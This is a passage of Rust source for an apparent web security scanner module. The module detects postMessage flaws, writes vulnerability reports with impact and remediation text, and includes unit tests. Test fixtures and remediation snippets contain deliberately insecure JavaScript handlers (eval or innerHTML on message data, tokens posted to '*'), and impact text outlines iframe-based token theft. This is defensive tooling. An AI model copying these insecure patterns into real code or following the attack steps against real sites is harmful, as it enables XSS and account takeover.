            Severity::Low => 3.7,
            Severity::Info => 2.0,
        };

        let impact_desc = self.get_impact_description(vuln_type, &severity);

        Vulnerability {
            id: format!("postmessage_{}", Self::generate_id()),
            vuln_type: vuln_type.to_string(),
            severity,
            confidence,
            category: "Client-Side Security".to_string(),
            url: url.to_string(),
            parameter: Some("postMessage".to_string()),
            payload: "N/A".to_string(),
            description: format!("{}\n\n**Impact:**\n{}", description, impact_desc),
            evidence: Some(evidence.chars().take(1000).collect()),
            cwe: cwe.to_string(),
            cvss: cvss as f32,
            verified,
            false_positive: false,
            remediation: self.get_remediation(vuln_type, cwe),
            discovered_at: chrono::Utc::now().to_rfc3339(),
            ml_data: None,
        }
    }

    /// Get impact description based on vulnerability type
    fn get_impact_description(&self, vuln_type: &str, severity: &Severity) -> String {
        match vuln_type {
            "PostMessage XSS" => {
                "An attacker can execute arbitrary JavaScript in the context of the vulnerable page by:\n\
                1. Creating a malicious page that embeds the target in an iframe\n\
                2. Sending a crafted postMessage with XSS payload\n\
                3. The payload executes with the victim's session, allowing cookie theft, keylogging, or phishing".to_string()
            }
            "PostMessage Origin Validation" => {
                "Without proper origin validation, any website can send messages to this handler:\n\
                1. Attacker embeds the target page in an iframe on their site\n\
                2. Attacker sends crafted messages that the handler trusts\n\
                3. May lead to CSRF-like attacks, data manipulation, or information disclosure".to_string()
            }
            "OAuth Token Leak via PostMessage" | "OAuth Token Leak - Weak Origin Validation" => {
                "CRITICAL: OAuth tokens can be stolen by an attacker:\n\
                1. User visits attacker's page which embeds the OAuth callback\n\
                2. OAuth tokens are sent via postMessage with weak/no origin check\n\
                3. Attacker captures tokens and gains access to user's account\n\
                4. This can lead to complete account takeover".to_string()
            }
            "PostMessage Wildcard Target" => {
                "Data is broadcast to all origins via postMessage('*'):\n\
                1. Any page embedding this content receives the message\n\
                2. Sensitive data may be leaked to malicious pages\n\
                3. Could expose session tokens, user data, or internal state".to_string()
            }
            "Sensitive Data via PostMessage Wildcard" => {
                "HIGH RISK: Sensitive data (tokens/credentials) sent to all origins:\n\
                1. Authentication tokens or credentials are being broadcast\n\
                2. Any attacker page can capture this sensitive data\n\
                3. May lead to session hijacking or credential theft".to_string()
            }
            _ => {
                format!("Security vulnerability with {} severity. Requires manual verification.", severity)
            }
        }
    }

    /// Get remediation advice
    fn get_remediation(&self, vuln_type: &str, cwe: &str) -> String {
        let base_remediation = match vuln_type {
            "PostMessage XSS" => r#"**CRITICAL - Immediate Action Required:**

1. **Validate Origin Strictly**
```javascript
window.addEventListener('message', function(e) {
    // Use strict equality with the expected origin
    if (e.origin !== 'https://trusted-domain.com') {
        return;
    }
    // Process message only from trusted origin
});
```

2. **Never Use eval() or innerHTML with Message Data**
```javascript
// BAD - vulnerable to XSS
element.innerHTML = e.data;
eval(e.data);

// GOOD - use safe methods
element.textContent = e.data;
const parsed = JSON.parse(e.data);  // with validation
```

3. **Validate Message Content**
```javascript
// Validate message structure
if (typeof e.data !== 'object' || !e.data.type) {
    return;
}
// Use allowlist for message types
const allowedTypes = ['resize', 'close', 'update'];
if (!allowedTypes.includes(e.data.type)) {
    return;
}
```"#
                .to_string(),
            "PostMessage Origin Validation" => r#"**Required: Implement Strict Origin Validation**

1. **Use Strict Equality (===)**
```javascript
// CORRECT
if (e.origin === 'https://trusted.com') {
    // Process message
}

// WRONG - these can be bypassed!
if (e.origin.indexOf('trusted.com') !== -1) { }  // attacker.com?trusted.com
if (e.origin.includes('trusted.com')) { }         // attackertrusted.com
if (e.origin.endsWith('trusted.com')) { }         // attackertrusted.com
```

2. **Use Allowlist for Multiple Origins**
```javascript
const ALLOWED_ORIGINS = [
    'https://trusted-domain.com',
    'https://sub.trusted-domain.com'
];

window.addEventListener('message', function(e) {
    if (!ALLOWED_ORIGINS.includes(e.origin)) {
        console.warn('Rejected message from:', e.origin);
        return;
    }
    // Safe to process
});
```

3. **Never Accept Null Origin**
```javascript
// NEVER do this - null origin can be spoofed!
if (e.origin === 'null' || e.origin === null) { }
```"#
                .to_string(),
            "OAuth Token Leak via PostMessage" | "OAuth Token Leak - Weak Origin Validation" => {
                r#"**CRITICAL - OAuth Token Security**

1. **Never Use Wildcard for Token Messages**
```javascript
// WRONG - anyone can receive tokens!
parent.postMessage({token: accessToken}, '*');

// CORRECT - specify exact origin
parent.postMessage({token: accessToken}, 'https://your-app.com');
```

2. **Validate Parent Origin Before Sending**
```javascript
// Before sending tokens, verify the parent
const ALLOWED_PARENT = 'https://your-app.com';
if (document.referrer.startsWith(ALLOWED_PARENT)) {
    parent.postMessage({token: accessToken}, ALLOWED_PARENT);
} else {
    console.error('Invalid parent origin');
}
```

3. **Use State Parameter**
- Generate random state before OAuth flow
- Verify state in callback
- This prevents CSRF on OAuth flow

4. **Consider Window.opener Instead**
```javascript
// For popup-based OAuth, use opener
if (window.opener && window.opener.origin === ALLOWED_ORIGIN) {
    window.opener.postMessage({token: accessToken}, ALLOWED_ORIGIN);
    window.close();
}
```"#
                    .to_string()
            }
            "PostMessage Wildcard Target" | "Sensitive Data via PostMessage Wildcard" => {
                r#"**Required: Specify Target Origin**

1. **Always Specify Target Origin**
```javascript
// WRONG - broadcasts to everyone
frame.contentWindow.postMessage(data, '*');

// CORRECT - specify exact origin
frame.contentWindow.postMessage(data, 'https://trusted.com');
```

2. **For Unknown Targets, Use Referrer Validation**
```javascript
// If target origin varies, store it safely
const targetOrigin = new URL(frame.src).origin;
frame.contentWindow.postMessage(data, targetOrigin);
```

3. **Don't Send Sensitive Data via PostMessage**
- Consider using server-side communication
- If required, encrypt sensitive payloads
- Use one-time tokens instead of persistent credentials"#
                    .to_string()
            }
            _ => {
                format!(
                    r#"**General PostMessage Security Guidelines:**

1. Always validate message origin using strict equality (===)
2. Never use eval(), innerHTML, or document.write() with message data
3. Validate message content structure and types
4. Use allowlists for trusted origins
5. Never accept 'null' origin
6. Never use wildcard '*' as target origin for sensitive data
7. Implement proper error handling for JSON.parse()

Reference: https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage#security_concerns

CWE: {}"#,
                    cwe
                )
            }
        };

        format!("{}\n\n**References:**\n- https://owasp.org/www-community/attacks/DOM_Based_XSS\n- https://portswigger.net/web-security/dom-based/controlling-the-web-message-source\n- {}",
            base_remediation,
            format!("https://cwe.mitre.org/data/definitions/{}.html", cwe.replace("CWE-", ""))
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn create_test_scanner() -> PostMessageVulnsScanner {
        let http_client = Arc::new(HttpClient::new(5, 2).unwrap());
        PostMessageVulnsScanner::new(http_client)
    }

    #[test]
    fn test_detect_no_origin_check() {
        let scanner = create_test_scanner();

        let vulnerable_code = r#"
            window.addEventListener('message', function(e) {
                eval(e.data);
            });
        "#;

        let (has_check, validation) = scanner.detect_origin_validation(vulnerable_code);
        assert!(!has_check || matches!(validation, Some(OriginValidationType::None)));
    }

    #[test]
    fn test_detect_strict_origin_check() {
        let scanner = create_test_scanner();

        let safe_code = r#"
            window.addEventListener('message', function(e) {
                if (e.origin === 'https://trusted.com') {
                    console.log(e.data);
                }
            });
        "#;

        let (has_check, validation) = scanner.detect_origin_validation(safe_code);
        assert!(has_check);
        assert!(matches!(
            validation,
            Some(OriginValidationType::StrictEquality)
        ));
    }

    #[test]
    fn test_detect_weak_indexof_check() {
        let scanner = create_test_scanner();

        let weak_code = r#"
            window.addEventListener('message', function(e) {
                if (e.origin.indexOf('trusted.com') > -1) {
                    console.log(e.data);
                }
            });
        "#;

        let (has_check, validation) = scanner.detect_origin_validation(weak_code);
        assert!(has_check);
        assert!(matches!(validation, Some(OriginValidationType::IndexOf)));
    }

    #[test]
    fn test_detect_weak_includes_check() {
        let scanner = create_test_scanner();

        let weak_code = r#"
            window.addEventListener('message', function(event) {
                if (event.origin.includes('trusted')) {
                    processData(event.data);
                }
            });
        "#;

        let (has_check, validation) = scanner.detect_origin_validation(weak_code);
        assert!(has_check);
        assert!(matches!(validation, Some(OriginValidationType::Includes)));
    }

    #[test]
    fn test_detect_null_origin_acceptance() {
        let scanner = create_test_scanner();

        let null_accept_code = r#"
            window.addEventListener('message', function(e) {
                if (e.origin === 'null' || e.origin === 'https://trusted.com') {
                    processMessage(e.data);
                }
            });
        "#;

        let (has_check, validation) = scanner.detect_origin_validation(null_accept_code);
        assert!(has_check);
        assert!(matches!(
            validation,
            Some(OriginValidationType::AcceptsNull)
        ));
    }

    #[test]
    fn test_detect_dangerous_sinks() {
        let scanner = create_test_scanner();

        // Test eval detection
        let eval_code = "window.addEventListener('message', function(e) { eval(e.data); });";
        let sinks = scanner.detect_dangerous_sinks(eval_code);
        assert!(sinks.contains(&DangerousSink::Eval));

        // Test innerHTML detection
        let innerhtml_code = "window.onmessage = function(e) { element.innerHTML = e.data; };";
        let sinks = scanner.detect_dangerous_sinks(innerhtml_code);
        assert!(sinks.contains(&DangerousSink::InnerHtml));

        // Test location.href detection
        let location_code =
            "window.addEventListener('message', (e) => { location.href = e.data.url; });";
        let sinks = scanner.detect_dangerous_sinks(location_code);
        assert!(sinks.contains(&DangerousSink::LocationHref));
    }

    #[test]
    fn test_find_message_handlers() {
        let scanner = create_test_scanner();

        let js_with_handlers = r#"
            // Handler 1
            window.addEventListener('message', function(event) {
                console.log(event.data);
            });

            // Handler 2
            window.onmessage = function(e) {
                processMessage(e);
            };
        "#;

        let handlers = scanner.find_message_handlers(js_with_handlers, "test.js");
        assert!(!handlers.is_empty());
    }

    #[test]
    fn test_wildcard_postmessage_detection() {
        let scanner = create_test_scanner();

        let js_with_wildcard = r#"
            frame.contentWindow.postMessage({action: 'init'}, '*');
            other.postMessage(data, '*');
        "#;

        let vulns = scanner.analyze_postmessage_calls(js_with_wildcard, "http://example.com");
        assert!(!vulns.is_empty());
        assert!(vulns.iter().any(|v| v.vuln_type.contains("Wildcard")));
    }

    #[test]
    fn test_sensitive_data_wildcard_detection() {
        let scanner = create_test_scanner();

        let sensitive_code = r#"
            parent.postMessage({token: accessToken, sessionId: sid}, '*');
        "#;

        let vulns = scanner.analyze_postmessage_calls(sensitive_code, "http://example.com");
        assert!(vulns.iter().any(|v| v.vuln_type.contains("Sensitive")));
    }

    #[test]
    fn test_iframe_sandbox_analysis() {
        let scanner = create_test_scanner();

        // Dangerous combination
        let dangerous_html = r#"<iframe src="https://external.com" sandbox="allow-scripts allow-same-origin"></iframe>"#;
        let vulns = scanner.analyze_iframes(dangerous_html, "http://example.com");
        assert!(vulns.iter().any(|v| v.vuln_type.contains("Sandbox")));

        // Safe sandbox
        let safe_html = r#"<iframe src="https://external.com" sandbox="allow-scripts"></iframe>"#;
        let vulns = scanner.analyze_iframes(safe_html, "http://example.com");
        assert!(!vulns
            .iter()
            .any(|v| v.vuln_type.contains("Misconfiguration")));
    }

    #[test]
    fn test_cross_origin_detection() {
        let scanner = create_test_scanner();

        assert!(scanner.is_cross_origin("https://example.com", "https://other.com"));
        assert!(scanner.is_cross_origin("https://example.com", "http://example.com"));
        assert!(!scanner.is_cross_origin("https://example.com/page1", "https://example.com/page2"));
        assert!(!scanner.is_cross_origin("https://example.com", "/relative/path"));
    }

    #[test]
    fn test_handler_analysis_critical_xss() {
        let scanner = create_test_scanner();

        let handler = MessageHandler {
            code: "addEventListener('message', function(e) { eval(e.data); })".to_string(),
            handler_type: HandlerType::AddEventListener,
            has_origin_check: false,
            origin_validation: Some(OriginValidationType::None),
            dangerous_sinks: vec![DangerousSink::Eval],
            source: "test.js".to_string(),
            line_hint: None,
        };

        let vuln = scanner.analyze_handler(&handler, "http://example.com");
        assert!(vuln.is_some());
        let v = vuln.unwrap();
        assert_eq!(v.severity, Severity::Critical);
        assert!(v.cwe.contains("79")); // XSS CWE
    }

    #[test]
    fn test_poc_generation() {
        let scanner = create_test_scanner();

        let vuln = scanner.create_vulnerability(
            "http://example.com",
            "PostMessage XSS",
            "Test vulnerability",
            "test evidence",
            Severity::Critical,
            "CWE-79",
            true,
        );

        let poc = scanner.generate_exploit_poc(&vuln);
        assert!(poc.is_some());
        assert!(poc.unwrap().contains("postMessage"));
    }

    #[test]
    fn test_extract_js_urls() {
        let scanner = create_test_scanner();

        let html = r#"
            <script src="/app.js"></script>
            <script src="https://example.com/bundle.js"></script>
            <script src="https://cdn.jsdelivr.net/npm/jquery"></script>
        "#;

        let urls = scanner.extract_js_urls(html, "https://example.com");

        // Should include local scripts
        assert!(urls.iter().any(|u| u.contains("app.js")));
        // Should include same-origin
        assert!(urls.iter().any(|u| u.contains("bundle.js")));
        // Should exclude CDN
        assert!(!urls.iter().any(|u| u.contains("jsdelivr")));
    }
}
